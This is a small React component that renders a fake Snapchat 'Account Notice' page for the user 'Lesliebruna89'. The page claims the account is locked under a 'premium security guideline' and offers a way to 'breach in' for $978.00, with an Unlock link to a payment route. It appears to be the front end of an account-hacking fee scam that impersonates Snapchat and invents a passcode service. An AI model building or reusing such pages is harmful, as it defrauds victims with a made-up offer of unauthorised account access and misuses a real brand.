import { Link } from "react-router-dom"
import snap from "../assets/img.png"

export default function Login() {
  return (
    <div className='container'>
      <div className="mainwindow">
        <div className="image">
        <img src={snap} height={120} alt="" />
        </div>
        <p>Lesliebruna89</p>

        <h2>Account Notice</h2>

        <p>You are unable to access Lesliebruna89 account as second party user because the owner is under Snapchat premium security guideline</p>
        <p>To breach in, get a one time passcode from the policy hub, <strong>cost $978.00</strong></p>
        <div className="button">
          <Link to={"/Lesliebruna89/pay"}>Unlock</Link>
          {/* <button onClick={()=> window.location.href = "/Lesliebruna89/pay"}>Unlock</button> */}
        </div>
        
      </div>
      {/* <p>New to snapchat </p> */}
    </div>
  )
}
